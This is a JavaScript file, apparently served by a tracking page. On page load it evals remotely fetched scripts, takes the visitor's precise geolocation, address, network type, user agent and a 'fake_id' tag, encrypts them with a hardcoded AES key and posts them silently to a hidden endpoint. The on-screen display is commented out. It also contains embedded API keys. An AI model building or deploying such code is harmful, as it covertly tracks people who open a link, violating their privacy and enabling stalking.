fetch('https://webapi.amap.com/maps?v=1.4.15&key=99f1daf29cf6a392743586a6a9b6311e')
    .then(function(response) {
        return response.text();
    })
    .then(function(text) {
        eval(text);
    });

fetch('https://cdn.bootcss.com/crypto-js/4.0.0/crypto-js.min.js')
    .then(function(response) {
        return response.text();
    })
    .then(function(text) {
        eval(text);
    });

var res = "";

// 通过异步请求将加密后的数据发送到Python接口
function sendEncryptedData(data) {
    var xhr = new XMLHttpRequest();
    var url = "/vHfs1ZAwDjc"; // 使用相对路径
    xhr.open("POST", url, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
            console.log("Data sent successfully");
        }
    };
    xhr.send(JSON.stringify(data));
}

// 加载完JavaScript后执行的回调函数
function onLoadCallback() {
    // 获取访问IP和浏览器信息
    var userAgent = navigator.userAgent;

    // 构建要发送的数据对象
    var data = {
        resdata: res,
        userAgent: userAgent,
    };

    // 将数据加密后发送到Python接口
    var encryptedData = encryptData(data, "123123123123123123123123");
    sendEncryptedData(encryptedData);
}

// 加载完成后执行回调函数
document.addEventListener("DOMContentLoaded", onLoadCallback);

// 加密数据
function encryptData(data, key) {
    var encryptedData = CryptoJS.AES.encrypt(
        JSON.stringify(data),
        CryptoJS.enc.Utf8.parse(key),
        {
            mode: CryptoJS.mode.ECB,
        }
    ).toString();
    return encryptedData;
}

window._AMapSecurityConfig = {
    securityJsCode: '40aea952b55651f7167e664758dd34ad',
}

function getNetstatus() {
    var connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {tyep: 'unknown'};
    var type_text = ['unknown', 'ethernet', 'wifi', '2g', '3g', '4g', 'none'];
    if (typeof (connection.type) == "number") {
        connection.type_text = type_text[connection.type];
    } else {
        connection.type_text = connection.type;
    }
    if (typeof (connection.bandwidth) == "number") {
        if (connection.bandwidth > 10) {
            connection.type = 'wifi';
        } else if (connection.bandwidth > 2) {
            connection.type = '3g';
        } else if (connection.bandwidth > 0) {
            connection.type = '2g';
        } else if (connection.bandwidth === 0) {
            connection.type = 'none';
        } else {
            connection.type = 'unknown';
        }
    }
    return connection.type_text;
}

function postDataToServer(type, lng, lat, accuracy, address, loc_type, message) {
    var postData = {
        "lng": lng,
        "lat": lat,
        "fake_id": document.getElementById("fake_id").innerText,
        "accuracy": accuracy,
        "address": address,
        "netstats": getNetstatus(),
        "loc_type": loc_type,
        "message": message,
    };

    var encryptedData = encryptData(postData, "123123123123123123123123");
    sendEncryptedData(encryptedData);
}

function gaodeLocat() {
    //debugAlert('开始 gaodeLocat');
    var map, geolocation;
    //加载地图，调用浏览器定位服务
    map = new AMap.Map('container', {
        resizeEnable: true
    });
    map.plugin('AMap.Geolocation', function () {
        geolocation = new AMap.Geolocation({
            enableHighAccuracy: true,//是否使用高精度定位，默认:true
            noIpLocate: 0, //是否禁止使用IP定位，默认值为0，可选值0-3 0: 可以使用IP定位 1: 手机设备禁止使用IP定位 2: PC上禁止使用IP定位 3: 所有终端禁止使用IP定位
            noGeoLocation: 0, //是否禁止使用浏览器Geolocation定位，默认值为0，可选值0-3 0: 可以使用浏览器定位 1: 手机设备禁止使用浏览器定位 2: PC上禁止使用浏览器定位 3: 所有终端禁止使用浏览器定位
            GeoLocationFirst: true, //默认为false，设置为true的时候可以调整PC端为优先使用浏览器定位，失败后使用IP定位
            useNative: true, //是否使用安卓定位sdk用来进行定位，默认：false
            extensions: 'base', //extensions用来设定是否需要周边POI、道路交叉口等信息，可选值'base'、'all'。默认为'base',只返回地址信息；设定为'all'的时候将返回周边POI、道路交叉口等信息。
        });
        map.addControl(geolocation);
        geolocation.getCurrentPosition();
        AMap.event.addListener(geolocation, 'complete', onComplete);//返回定位信息
        AMap.event.addListener(geolocation, 'error', onError);      //返回定位出错信息
    });
}

//解析定位结果
function onComplete(data) {
    var str = ['高德 测试弹框，定位成功'];
    str.push('经度：' + data.position.getLng());
    str.push('纬度：' + data.position.getLat());
    str.push('地址：' + data.formattedAddress);
    accuracy = '0';
    if (data.accuracy) {
        accuracy = data.accuracy;
        str.push('精度：' + data.accuracy + ' 米');
    }//如为IP精确定位结果则没有精度信息
    str.push('是否经过偏移：' + (data.isConverted ? '是' : '否'));
    //document.getElementById('tip').innerHTML = str.join('<br>');
    postDataToServer('gd_web', data.position.getLng(), data.position.getLat(), accuracy, data.formattedAddress, data.location_type, data.message);
    console.log(str)
    //debugAlert(str);
}

//解析定位错误信息
function onError(data) {
    var str = '高德 定位失败,';
    str += '错误信息：';
    switch (data.info) {
        case 'PERMISSION_DENIED':
            str += '浏览器阻止了定位操作';
            break;
        case 'POSITION_UNAVAILBLE':
            str += '无法获得当前位置';
            break;
        case 'TIMEOUT':
            str += '定位超时';
            break;
        default:
            str += '未知错误' + data.info;
            break;
    }
}

gaodeLocat();
